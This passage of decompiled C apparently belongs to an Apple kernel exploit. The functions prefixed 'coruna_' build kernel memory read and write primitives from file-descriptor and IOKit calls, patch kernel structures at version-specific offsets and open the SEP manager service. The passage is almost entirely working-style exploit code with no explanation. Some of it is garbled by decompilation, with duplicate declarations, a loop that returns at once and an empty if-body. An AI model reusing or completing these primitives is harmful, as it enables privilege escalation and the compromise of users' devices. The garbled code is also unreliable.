  if ((((*(int *)(&k_kernel_slot_1930 + arg) != -1) && (*(int *)(&k_kernel_slot_1934 + arg) != -1)) &&
      (*(int *)(&k_kernel_slot_1940 + arg) != -1)) &&
     ((*(long *)(arg + 0x218) != 0 && (serial_11 = coruna_kptr_in_mapped_range(arg), serial_11 != 0)))) {
    i = (int *)(&k_kernel_slot_1930 + arg);
    cache_86 = 0xffffffff;
    if ((p == 0) ||
       ((type_id_16 = coruna_open_dev_null(&cache_86), (int)type_id_16 == 0 &&
        (type_id_16 = coruna_fd_drain(i), (int)type_id_16 == 0)))) {
      type_id_13 = 4;
      if (*(long *)(arg + 0x220) != 0) {
        type_id_13 = 8;
      }
      if (m != 0) {
        type_id_14 = 0;
        do {
          type_id_16 = val + type_id_14;
          tag = m - (int)type_id_14;
          ls12 = (size_t)tag;
          if ((((*(unsigned long *)(arg + 0x188) & type_id_16) != 0) || (tag < 0x4000)) ||
             (n = coruna_uuid_is_null(arg), n == 0)) {
            if (type_id_13 < tag || type_id_13 - tag == 0) {
              type_id_15 = 0;
            }
            else {
              port = 0;
              if ((((type_id_16 - 1) + ls12 ^ (type_id_16 - 1) + (unsigned long)type_id_13) &
                  (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff)) != 0) {
                port = type_id_13 - tag;
              }
              type_id_15 = (unsigned long)port;
            }
            if (*(long *)(arg + 0x220) == 0) {
              type_id_16 = coruna_kernel600c_via_fd_read_full_3(arg,type_id_16 - type_id_15);
              if ((int)type_id_16 == 0) {
                j = ___error();
                *j = 0;
                n = _fcntl(*(int *)(&k_kernel_slot_1940 + arg),5);
                cache_36[0] = n;
                if ((n == -1) && (j = ___error(), *j != 0)) {
                  j = ___error();
                  n = *j;
                  entry_9 = (uint *)___error();
                  tag = -*entry_9;
                  if (-1 < n) {
                    tag = *entry_9;
                  }
                  type_id_16 = (unsigned long)(tag | 0x40000000);
                  tag = type_id_13;
                }
                else {
                  if (3 < tag) {
                    ls12 = 4;
                  }
                  _memcpy((void *)(n + type_id_14),(void *)((long)cache_36 + type_id_15),ls12);
                  type_id_16 = 0;
                  tag = type_id_13;
                }
                coruna_kernel600c_via_fd_read_full_4(arg);
                if (*(long *)k_kernel_stack_chk_guard_slot != cache_75) {
                ___stack_chk_fail();
                }
                return type_id_16;
              }
            }
            else if (((*i == -1) || (*(int *)(&k_kernel_slot_1934 + arg) == -1)) ||
                    (*(long *)(arg + 0x218) == 0)) {
              type_id_16 = 0xad001;
            }
            else {
              cache_36[0x22] = 0;
              cache_36[0x23] = 0;
              cache_36[0x20] = 0;
              cache_36[0x21] = 0;
              cache_36[0x26] = 0;
              cache_36[0x27] = 0;
              cache_36[0x24] = 0;
              cache_36[0x25] = 0;
              cache_36[0x1a] = 0;
              cache_36[0x1b] = 0;
              cache_36[0x18] = 0;
              cache_36[0x19] = 0;
              cache_36[0x1e] = 0;
              cache_36[0x1f] = 0;
              cache_36[0x1c] = 0;
              cache_36[0x1d] = 0;
              cache_36[0x12] = 0;
              cache_36[0x13] = 0;
              cache_36[0x10] = 0;
              cache_36[0x11] = 0;
              cache_36[0x16] = 0;
              cache_36[0x17] = 0;
              cache_36[0x14] = 0;
              cache_36[0x15] = 0;
              cache_36[10] = 0;
              cache_36[0xb] = 0;
              cache_36[8] = 0;
              cache_36[9] = 0;
              cache_36[0xe] = 0;
              cache_36[0xf] = 0;
              cache_36[0xc] = 0;
              cache_36[0xd] = 0;
              cache_36[2] = 0;
              cache_36[3] = 0;
              cache_36[0] = 0;
              cache_36[1] = 0;
              cache_36[6] = 0;
              cache_36[7] = 0;
              cache_36[4] = 0;
              cache_36[5] = 0;
              coruna_kernel600c_residual_227(arg,cache_36,*(long *)(arg + 0x218),(type_id_16 - type_id_15) + -0x48,7);
              type_id_16 = coruna_write(i,cache_36,0xa0);
              if (((int)type_id_16 == 0) &&
                 (type_id_16 = coruna_fd_read_full(i,cache_61,0xa0), (int)type_id_16 == 0)) {
                n = _memcmp(cache_36,cache_61,0xa0);
                if (n == 0) {
                  n = _ioctl(*(int *)(&k_kernel_slot_1940 + arg),0x40087367);
                  if (n == 0) {
                    if (7 < tag) {
                      ls12 = 8;
                    }
                    _memcpy((void *)(n + type_id_14),(void *)((long)cache_36 + type_id_15),ls12);
                    type_id_16 = 0;
                    tag = type_id_13;
                  }
                  else {
                    j = ___error();
                    n = *j;
                    entry_9 = (uint *)___error();
                    tag = -*entry_9;
                    if (-1 < n) {
                      tag = *entry_9;
                    }
                    type_id_16 = (unsigned long)(tag | 0x40000000);
                    tag = type_id_13;
                  }
                  coruna_kernel600c_via_fd_read_full_4(arg);
                  if (*(long *)k_kernel_stack_chk_guard_slot != cache_75) {
                  ___stack_chk_fail();
                  }
                  return type_id_16;
                }
                type_id_16 = 0xad014;
              }
            }
load_ok_62:
            coruna_kernel600c_via_fd_read_full_4(arg);
            if (*(long *)k_kernel_stack_chk_guard_slot != cache_75) {
            ___stack_chk_fail();
            }
            return type_id_16;
          }
          port = 0x80000;
          if (*(unsigned long *)(arg + 0x158) < 0x1f530f02800000) {
            port = 0x4000;
          }
          if (port <= tag) {
            tag = port;
          }
          type_id_16 = coruna_task_map_corpse_info_64(arg,type_id_16,n + type_id_14,tag);
load_ok_61:
          coruna_kernel600c_via_fd_read_full_4(arg);
          if (*(long *)k_kernel_stack_chk_guard_slot != cache_75) {
          ___stack_chk_fail();
          }
          return type_id_16;
        } while (tag < m);
      }
      type_id_16 = coruna_kernel600c_via_fd_read_full_4(arg);
load_ok_63:
      if (*(long *)k_kernel_stack_chk_guard_slot != cache_75) {
      ___stack_chk_fail();
      }
      return type_id_16;
    }
    coruna_close(cache_86);
  }
load_ok_64:
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_75) {
    ___stack_chk_fail();
  }
  return type_id_16;
}





uint coruna_task_map_corpse_info_64(long handle,uint64_t val,void *ctx,uint size)
{
  long handle;
  long addr;
  long off;
  int err;
  uint u;
  uint size;
  int *err;
  uint *ptr;
  unsigned long version;
  uint64_t port;
  long base;
  uint64_t tag;
  uint64_t scratch;
  long bootargs;
  mach_vm_size_t thread_attr;
  void *host_info;
  uint64_t serial_buf;
  
  u = 0xad001;
  serial_buf = val;
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    host_info = (void *)coruna_u64_pack((host_info), (size));
    if (*(int *)(&k_kernel_slot_1944 + handle) == -1) {
      return 0xad001;
    }
    base = *(long *)(&k_kernel_slot_1958 + handle);
    err = _uuid_is_null(&k_kernel_slot_1948 + handle);
    if (err != 0) {
      return 0xad001;
    }
    if (*(long *)(&k_kernel_slot_1958 + handle) == 0) {
      return 0xad001;
    }
    version = *(unsigned long *)(handle + 0x158);
    addr = 0x570;
    if (version < 0x1f541e00000000) {
      addr = 0x370;
    }
    off = 0x578;
    if (version < 0x1f541e00000000) {
      off = 0x378;
    }
    handle = 0x580;
    if (version >> 0x2b < 1099) {
      handle = addr;
    }
    handle = handle + base;
    addr = 0x588;
    if (version >> 0x2b < 1099) {
      addr = off;
    }
    err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,handle,&host_info,4,0);
    base = base + addr;
    if (err == 0) {
      u = 0x28010;
    }
    else {
      err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,base,&serial_buf,*(uint32_t *)(handle + 0x168),0);
      u = 0x28010;
      if (err != 0) {
        u = _necp_client_action(*(uint32_t *)(&k_kernel_slot_1944 + handle),3,
                                    &k_kernel_slot_1948 + handle,0x10,ctx,size);
        if (u == size) {
          u = 0;
        }
        else {
          err = ___error();
          err = *err;
          ptr = (uint *)___error();
          u = -*ptr;
          if (-1 < err) {
            u = *ptr;
          }
          u = u | 0x40000000;
        }
      }
    }
    host_info = (void *)((unsigned long)host_info & 0xffffffff00000000);
    err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,handle,&host_info,4,0);
    size = 0x28010;
    if (err != 0 || u != 0) {
      size = u;
    }
    serial_buf = 0;
    err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,base,&serial_buf,*(uint32_t *)(handle + 0x168),0);
    if (err != 0) {
      return size;
    }
    if (size == 0) {
      return 0x28010;
    }
    return size;
  }
  host_info = (void *)0x0;
  bootargs = 0;
  thread_attr = 0;
  scratch = 0;
  if (0x4000 < size) {
    return 0xad001;
  }
  if (*(long *)(handle + 0x230) == 0) {
    return 0xad001;
  }
  if (*(long *)(handle + 0x228) == 0) {
    return 0xad001;
  }
  if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
     (*(long *)(handle + 0x100) == 0)) {
    if (((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
       ((*(int *)(&k_kernel_slot_1940 + handle) == -1 || (*(long *)(handle + 0x218) == 0))))
    if ((host_info != (void *)0x0) && (thread_attr != 0)) {
    _mach_vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(mach_vm_address_t)host_info,
    thread_attr);
    }
    return u;
  }
  else {
    if (*(long *)(handle + 0xf0) == 0) {
      u = 0xad009;
      if ((host_info != (void *)0x0) && (thread_attr != 0)) {
      _mach_vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(mach_vm_address_t)host_info,
      thread_attr);
      }
      return u;
    }
    bootargs = *(long *)(handle + 0xf0) + 0x100;
  }
  err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,bootargs + 8,&serial_buf,*(uint32_t *)(handle + 0x168),0);
  u = 0x28010;
  if (err != 0) {
    port = *(uint64_t *)(handle + 0x228);
    err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,port,&bootargs,*(uint32_t *)(handle + 0x168),0);
    if (err != 0) {
      tag = *(uint64_t *)(handle + 0x230);
      err = coruna_kernel600c_via_kernel600c_via_fd_read_full_3(handle,tag,4,(long)&scratch + 4,0);
      u = 0x2800f;
      size = u;
      if (err != 0) {
        scratch = coruna_u64_pack((scratch), (scratch)) | 0x20;
        err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,tag,&scratch,4,0);
        size = 0x28010;
        if (err != 0) {
          size = _task_map_corpse_info_64
                            (*(uint32_t *)k_kernel_mach_task_self_slot,
                             *(uint32_t *)k_kernel_mach_task_self_slot,&host_info,&thread_attr);
          if (size == 0) {
            if ((host_info != (void *)0x0) && (thread_attr == 0x4000)) {
              _memcpy(ctx,host_info,0x4000);
              u = 0;
            }
          }
          else {
            u = size | 0x80000000;
          }
          err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,tag,(long)&scratch + 4,4,0);
          size = u;
          if ((err == 0) && (size = 0x28010, u != 0)) {
            size = u;
          }
        }
      }
      bootargs = 0;
      err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,port,&bootargs,*(uint32_t *)(handle + 0x168),0);
      u = size;
      if ((err == 0) && (u = 0x28010, size != 0)) {
        u = size;
      }
    }
  }
fail:
  if ((host_info != (void *)0x0) && (thread_attr != 0)) {
    _mach_vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(mach_vm_address_t)host_info,
                        thread_attr);
  }
  return u;
}





unsigned long coruna_kernel600c_via_fd_read_full_3(long arg,long val)

{
  uint type_id_21;
  int n;
  unsigned long u;
  uint8_t cache_87[160];
  uint64_t cache_44;
  uint64_t cache_42;
  uint64_t cache_25;
  uint64_t cache_43;
  uint64_t cache_47;
  long cache_48;
  uint64_t cache_87;
  long cache_88;
  uint64_t cache_89;
  uint64_t cache_48;
  uint64_t cache_52;
  uint64_t cache_49;
  uint64_t cache_51;
  uint64_t cache_51;
  uint64_t cache_88;
  uint64_t cache_54;
  uint64_t cache_90;
  uint64_t cache_56;
  uint64_t cache_86;
  uint64_t cache_57;
  long cache_91;
  
  cache_91 = *(long *)k_kernel_stack_chk_guard_slot;
  u = 0xad001;
  if (((*(int *)(&k_kernel_slot_1930 + arg) != -1) && (*(int *)(&k_kernel_slot_1934 + arg) != -1)) &&
     (*(long *)(arg + 0x218) != 0)) {
    cache_47 = 0;
    cache_87 = 0;
    cache_88 = val + -0x60;
    cache_56 = 0;
    cache_90 = 0;
    cache_57 = 0;
    cache_86 = 0;
    cache_51 = 0;
    cache_54 = 0;
    cache_88 = 0;
    cache_48 = 0;
    cache_89 = 0;
    cache_49 = 0;
    cache_42 = 0;
    cache_44 = 0;
    cache_43 = 0;
    cache_25 = k_kernel_rodata_word_37750;
    cache_48 = *(long *)(arg + 0x218) + 0x60;
    cache_51 = 2;
    cache_52 = 0x22000000;
    u = coruna_write(&k_kernel_slot_1930 + arg,&cache_44,0xa0);
    if (((int)u == 0) &&
       (u = coruna_fd_read_full(&k_kernel_slot_1930 + arg,cache_87,0xa0), (int)u == 0)) {
      n = _memcmp(&cache_44,cache_87,0xa0);
      type_id_21 = 0;
      if (n != 0) {
        type_id_21 = 0xad014;
      }
      u = (unsigned long)type_id_21;
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_91) {
    ___stack_chk_fail();
  }
  return u;
}





unsigned long coruna_kernel600c_via_fd_read_full_4(long arg)

{
  uint type_id_21;
  int n;
  unsigned long u;
  uint8_t cache_87[160];
  uint64_t cache_44;
  uint64_t cache_42;
  uint64_t cache_25;
  uint64_t cache_43;
  uint64_t cache_47;
  long cache_48;
  uint64_t cache_87;
  uint64_t cache_46;
  uint64_t cache_89;
  uint64_t cache_48;
  uint64_t cache_52;
  uint64_t cache_49;
  uint64_t cache_51;
  uint64_t cache_51;
  uint64_t cache_88;
  uint64_t cache_54;
  uint64_t cache_90;
  uint64_t cache_56;
  uint64_t cache_86;
  uint64_t cache_57;
  long cache_91;
  
  cache_91 = *(long *)k_kernel_stack_chk_guard_slot;
  u = 0xad001;
  if (((*(int *)(&k_kernel_slot_1930 + arg) != -1) && (*(int *)(&k_kernel_slot_1934 + arg) != -1)) &&
     (*(long *)(arg + 0x218) != 0)) {
    cache_56 = 0;
    cache_90 = 0;
    cache_57 = 0;
    cache_86 = 0;
    cache_51 = 0;
    cache_54 = 0;
    cache_88 = 0;
    cache_48 = 0;
    cache_89 = 0;
    cache_49 = 0;
    cache_47 = 0;
    cache_46 = 0;
    cache_87 = 0;
    cache_42 = 0;
    cache_44 = 0;
    cache_43 = 0;
    cache_25 = k_kernel_rodata_word_37750;
    cache_48 = *(long *)(arg + 0x218) + 0x60;
    cache_51 = 3;
    cache_52 = 0x22000000;
    u = coruna_write(&k_kernel_slot_1930 + arg,&cache_44,0xa0);
    if (((int)u == 0) &&
       (u = coruna_fd_read_full(&k_kernel_slot_1930 + arg,cache_87,0xa0), (int)u == 0)) {
      n = _memcmp(&cache_44,cache_87,0xa0);
      type_id_21 = 0;
      if (n != 0) {
        type_id_21 = 0xad014;
      }
      u = (unsigned long)type_id_21;
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_91) {
    ___stack_chk_fail();
  }
  return u;
}





unsigned long coruna_fcntl_1d334(long arg,long val,long n,uint m,int p)

{
  unsigned long type_id_21;
  uint type_id_17;
  int fd_12;
  long serial_12;
  int *ret;
  uint *ptr;
  unsigned long port;
  uint type_id_14;
  uint type_id_15;
  uint32_t cache_77;
  uint32_t cache_31;
  
  port = 0xad001;
  if ((((*(int *)(&k_kernel_slot_1930 + arg) != -1) && (*(int *)(&k_kernel_slot_1934 + arg) != -1)) &&
      (*(int *)(&k_kernel_slot_1940 + arg) != -1)) &&
     ((*(long *)(arg + 0x218) != 0 && (serial_12 = coruna_kptr_in_mapped_range(arg), serial_12 != 0)))) {
    cache_31 = 0xffffffff;
    if ((p == 0) ||
       ((port = coruna_open_dev_null(&cache_31), (int)port == 0 &&
        (port = coruna_fd_drain(&k_kernel_slot_1930 + arg), (int)port == 0)))) {
      if (m != 0) {
        type_id_14 = 0;
        do {
          type_id_17 = m - type_id_14;
          cache_77 = 0;
          serial_12 = val + (unsigned long)type_id_14;
          if (type_id_17 < 4) {
            type_id_15 = 0;
            if ((((serial_12 + (unsigned long)type_id_17) - 1 ^ serial_12 + 3U) &
                (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff)) != 0) {
              type_id_15 = 4 - type_id_17;
            }
          }
          else {
            type_id_15 = 0;
          }
          type_id_21 = 4 - (unsigned long)type_id_15;
          if ((unsigned long)type_id_17 <= 4 - (unsigned long)type_id_15) {
            type_id_21 = (unsigned long)type_id_17;
          }
          if (((type_id_21 < 4) &&
              (port = coruna_fcntl_1c9b8(arg,serial_12 - (unsigned long)type_id_15,&cache_77,4,0), (int)port != 0))
             || (port = coruna_kernel600c_via_fd_read_full_3(arg,serial_12 - (unsigned long)type_id_15), (int)port != 0)) {
load_ok_65:
            coruna_kernel600c_via_fd_read_full_4(arg);
            {
              if (p == 0) {
              return port;
              }
            }
          }
          _memcpy((void *)((long)&cache_77 + (unsigned long)type_id_15),(void *)(n + (unsigned long)type_id_14),type_id_21);
          if (*(long *)(arg + 0x220) == 0) {
            fd_12 = _fcntl(*(int *)(&k_kernel_slot_1940 + arg),6);
          }
          else {
            fd_12 = _ioctl(*(int *)(&k_kernel_slot_1940 + arg),0x8004667c);
          }
          if (fd_12 != 0) {
            ret = ___error();
            fd_12 = *ret;
            ptr = (uint *)___error();
            type_id_14 = -*ptr;
            if (-1 < fd_12) {
              type_id_14 = *ptr;
            }
            port = (unsigned long)(type_id_14 | 0x40000000);
            {
              coruna_kernel600c_via_fd_read_full_4(arg);
              {
              if (p == 0) {
              return port;
              }
              }
            }
          }
          type_id_14 = (type_id_14 - type_id_15) + 4;
        } while (type_id_14 < m);
      }
      port = coruna_kernel600c_via_fd_read_full_4(arg);
load_ok_66:
      if (p == 0) {
        return port;
      }
    }
    coruna_close(cache_31);
  }
  return port;
}





uint64_t coruna_semaphore_destroy(long handle,int flags)
{
  pthread_t p_Var1;
  long *ptr;
  
  ptr = *(long **)(handle + 0x28);
  if (ptr != (long *)0x0) {
    *(uint8_t *)(handle + 0xc) = 0;
    *(uint64_t *)(handle + 0x28) = 0;
    p_Var1 = (pthread_t)*ptr;
    if (p_Var1 != (pthread_t)0x0) {
      if (1 < *(semaphore_t *)(ptr + 1) + 1 && flags != 0) {
        *(uint8_t *)(ptr + 7) = 1;
        _semaphore_signal(*(semaphore_t *)(ptr + 1));
        p_Var1 = (pthread_t)*ptr;
      }
      _pthread_join(p_Var1,(void **)0x0);
      *ptr = 0;
    }
    if (1 < *(semaphore_t *)(ptr + 1) + 1) {
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,*(semaphore_t *)(ptr + 1));
      *(uint32_t *)(ptr + 1) = 0;
    }
    if (1 < *(semaphore_t *)((long)ptr + 0xc) + 1) {
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,
                         *(semaphore_t *)((long)ptr + 0xc));
      *(uint32_t *)((long)ptr + 0xc) = 0;
    }
    if ((int)ptr[2] != -1) {
      _close((int)ptr[2]);
      *(uint32_t *)(ptr + 2) = 0xffffffff;
    }
    ptr[5] = 0;
    ptr[4] = 0;
    ptr[7] = 0;
    ptr[6] = 0;
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
    _free(ptr);
  }
  return 0;
}





unsigned long coruna_open_sepmgr(long arg)

{
  uint8_t *str;
  uint type_id_17;
  int fd_12;
  uint64_t *entry_10;
  unsigned long version;
  bool idx;
  uint64_t cache_53;
  semaphore_t cache_55 [2];
  
  if (*(unsigned long *)(arg + 0x158) < 0x1f530000000000) {
    if (*(char *)(arg + 0xc) != '\0') {
      return 0;
    }
    version = (unsigned long)*(uint *)(arg + 0x10);
    if (*(uint *)(arg + 0x10) + 1 < 2) {
      version = coruna_ioservicegetmatchingservice_1bb7c("AppleSEPManager");
      if ((int)version + 1U < 2) {
        return 0xad011;
      }
      *(int *)(arg + 0x10) = (int)version;
    }
    str = k_kernel_mach_task_self_slot;
    idx = false;
    while (type_id_17 = __IOServiceSetAuthorizationID(version,0), type_id_17 == 0xe00002c1) {
      return (unsigned long)(type_id_17 & 0xfff | 0x70000000);
    }
    if (type_id_17 != 0) {
load_ok_67:
      return (unsigned long)(type_id_17 & 0xfff | 0x70000000);
    }
load_ok_68:
    *(uint8_t *)(arg + 0xc) = 1;
    return 0;
  }
  cache_53 = 0;
  cache_55[0] = 0;
  cache_55[1] = 0;
  if (*(char *)(arg + 0xc) != '\0') {
    return 0;
  }
  entry_10 = _calloc(1,0x40);
  if (entry_10 == (uint64_t *)0x0) {
    return 0xad009;
  }
  *(uint32_t *)(entry_10 + 2) = 0xffffffff;
  *(uint64_t **)(arg + 0x28) = entry_10;
  str = k_kernel_mach_task_self_slot;
  type_id_17 = _semaphore_create(*(task_t *)k_kernel_mach_task_self_slot,cache_55 + 1,0,0);
  if (type_id_17 == 0) {
    *(semaphore_t *)(entry_10 + 1) = cache_55[1];
    type_id_17 = _semaphore_create(*(task_t *)str,cache_55,0,0);
    if (type_id_17 == 0) {
      *(semaphore_t *)((long)entry_10 + 0xc) = cache_55[0];
      version = coruna_pthread_attr_setdetachstate_2ef40(arg,&cache_53,coruna_mach_port_deallocate_1f284,arg);
      coruna_semaphore_destroy(arg,0);
      return version;
    }
  }
  version = (unsigned long)(type_id_17 | 0x80000000);
load_ok_69:
  coruna_semaphore_destroy(arg,0);
  return version;
}





void coruna_ioconnectcallmethod(long handle,long addr_2,int flags)
{
  uint32_t u;
  uint64_t size;
  int err;
  long handle;
  long addr;
  uint32_t *ptr;
  long off;
  uint8_t scratch[8];
  long bootargs;
  uint thread_attr;
  uint32_t host_info;
  uint32_t serial_buf;
  uint16_t action[2];
  uint32_t block_ctx;
  uint64_t stack_guard;
  long sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t scratch;
  uint64_t tmp_buf;
  uint64_t bootargs;
  uint64_t region;
  uint64_t thread_attr;
  unsigned long plist;
  uint64_t url_buf;
  uint64_t host_info;
  uint64_t json_buf;
  long frame;
  
  frame = *(long *)k_kernel_stack_chk_guard_slot;
  off = *(long *)(&k_kernel_slot_1d58 + handle);
  block_ctx = 0x4000;
  sa_saved = addr_2;
  handle = coruna_mach_port_request_notification_29a50(handle,&block_ctx);
  if (handle != 0) {
    action[0] = 0x100;
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle,action,2);
    if (((((err != 0) &&
          (err = coruna_kernel600c_residual_307(handle,*(long *)(off + 0xe8) + (unsigned long)*(uint *)(off + 0xb8),
                                &stack_guard), err != 0)) &&
         (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xb4),4,
                               &serial_buf), err != 0)) &&
        ((err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc4),4,
                               &host_info), err != 0 &&
         (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc0),4,
                               &thread_attr), err != 0)))) &&
       ((err = coruna_kernel600c_residual_307(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xbc),
                              &bootargs), err != 0 &&
        ((bootargs != 0 &&
         (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,bootargs + (unsigned long)*(uint *)(off + 0xac),8,scratch),
         err != 0)))))) {
      u = 0x10002;
      if (*(unsigned long *)(handle + 0x158) < 0x27120000000000) {
        u = 0x10003;
      }
      ptr = *(uint32_t **)(off + 0x98);
      *ptr = u;
      ptr[1] = 0x10;
      *(uint16_t *)(ptr + 2) = 0;
      size = k_kernel_rodata_word_43340;
      addr = *(long *)(off + 0xa0);
      *(uint64_t *)(addr + 0x10) = k_kernel_rodata_word_00043348;
      *(uint64_t *)(addr + 8) = size;
      plist = (unsigned long)*(uint *)(off + 0xc);
      host_info = k_kernel_rodata_word_00043808;
      url_buf = k_kernel_rodata_word_43800;
      json_buf = 0x38;
      bootargs = 0;
      tmp_buf = 0;
      thread_attr = 0;
      region = 0;
      scratch = 0;
      path_buf = 0;
      sa_new = *(uint64_t *)(off + 0x1c);
      sa_saved = addr_2 - (unsigned long)thread_attr;
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,*(long *)(off + 0xe8) + (unsigned long)*(uint *)(off + 0xb8),handle);
      if (err != 0) {
        err = coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xb4),1);
        if (err != 0) {
          err = coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc4),
                               flags + -0x100);
          if (err != 0) {
            err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,bootargs + (unsigned long)*(uint *)(off + 0xac),&sa_saved,8);
            if (err != 0) {
              _IOConnectCallMethod
                        (*(uint32_t *)(off + 8),0x1a,&plist,4,&sa_new,0x38,0,0,0,0);
              coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,bootargs + (unsigned long)*(uint *)(off + 0xac),scratch,8);
            }
            coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc4),host_info);
          }
          coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xb4),serial_buf);
        }
        coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,*(long *)(off + 0xe8) + (unsigned long)*(uint *)(off + 0xb8),stack_guard);
      }
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == frame) {
    return;
  }
  ___stack_chk_fail();
}





unsigned long coruna_ioconnectcallmethod_1dbc0(long arg,long val,long n,uint m,int p)

{
  long handle;
  unsigned long type_id_17;
  long serial_11;
  int err;
  uint version;
  long serial_16;
  unsigned long port;
  unsigned long type_id_14;
  uint64_t type_id_15;
  uint type_id_16;
  uint tag;
  uint64_t cache_27;
  uint32_t cache_50;
  unsigned long cache_51 [3];
  long cache_77;
  
  cache_77 = *(long *)k_kernel_stack_chk_guard_slot;
  type_id_14 = 0xad001;
  port = type_id_14;
  if (((((1 < *(int *)(arg + 0xe8) + 1U) && (*(long *)(arg + 0xf8) != 0)) &&
       (*(long *)(arg + 0x100) != 0)) && (serial_16 = coruna_kptr_in_mapped_range(arg), serial_16 != 0)) &&
     ((cache_50 = 0xffffffff, p == 0 || (port = coruna_open_dev_null(&cache_50), (int)port == 0))))
  {
    if (m != 0) {
      type_id_16 = 0;
      do {
        version = m - type_id_16;
        cache_27 = 0;
        serial_16 = val + (unsigned long)type_id_16;
        if (version < 8) {
          tag = 0;
          if ((((serial_16 + (unsigned long)version) - 1 ^ serial_16 + 7U) &
              (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff)) != 0) {
            tag = 8 - version;
          }
        }
        else {
          tag = 0;
        }
        type_id_17 = 8 - (unsigned long)tag;
        if ((unsigned long)version <= 8 - (unsigned long)tag) {
          type_id_17 = (unsigned long)version;
        }
        if ((type_id_17 < 8) &&
           (port = coruna_ioconnectcallmethod(arg,serial_16 - (unsigned long)tag,&cache_27,8,0), (int)port != 0))
        goto load_ok_74;
        _memcpy((void *)((long)&cache_27 + (unsigned long)tag),(void *)(n + (unsigned long)type_id_16),type_id_17);
        err = *(int *)(arg + 0xe8);
        port = type_id_14;
        if ((err + 1U < 2) ||
           ((*(long *)(arg + 0xf8) == 0 || (*(long *)(arg + 0x100) == 0))))
        goto load_ok_74;
        handle = *(long *)(arg + 0x108) + *(long *)(arg + 0xf8);
        serial_11 = 0x368;
        if (*(int *)(arg + 0x140) < 0x2258) {
          serial_11 = 0x360;
        }
        type_id_15 = *(uint64_t *)(handle + serial_11);
        *(unsigned long *)(handle + serial_11) = serial_16 - (unsigned long)tag;
        cache_51[0] = (unsigned long)*(uint *)(arg + 0x110);
        cache_51[1] = 0;
        cache_51[2] = cache_27;
        version = _IOConnectCallMethod(err,0x21,cache_51,3,0,0,0,0,0,0);
        if ((*(long *)(arg + 0xf8) == 0) || (*(long *)(arg + 0x100) == 0)) {
          if (version != 0) {
load_ok_75:
            port = (unsigned long)(version | 0x80000000);
          }
          goto load_ok_74;
        }
        serial_16 = 0x368;
        if (*(int *)(arg + 0x140) < 0x2258) {
          serial_16 = 0x360;
        }
        *(uint64_t *)(*(long *)(arg + 0x108) + *(long *)(arg + 0xf8) + serial_16) = type_id_15;
        if (version != 0) goto load_ok_75;
        type_id_16 = (type_id_16 - tag) + 8;
      } while (type_id_16 < m);
    }
    port = 0;
load_ok_74:
    if (p != 0) {
      coruna_close(cache_50);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_77) {
    ___stack_chk_fail();
  }
  return port;
}





uint64_t coruna_mach_port_deallocate_1de20(long handle)
{
  vm_address_t address;
  
  if (1 < *(int *)(handle + 0x5c) + 1U) {
    _IOObjectRelease();
    *(uint32_t *)(handle + 0x5c) = 0;
  }
  address = *(vm_address_t *)(handle + 0x60);
  if ((address != 0) && (*(vm_size_t *)(handle + 0x68) != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,*(vm_size_t *)(handle + 0x68)
                  );
    *(vm_address_t *)(handle + 0x60) = 0;
    *(uint64_t *)(handle + 0x68) = 0;
  }
  *(uint64_t *)(handle + 0x70) = 0;
  *(uint64_t *)(handle + 0x78) = 0;
  if (1 < *(mach_port_name_t *)(handle + 0x58) + 1) {
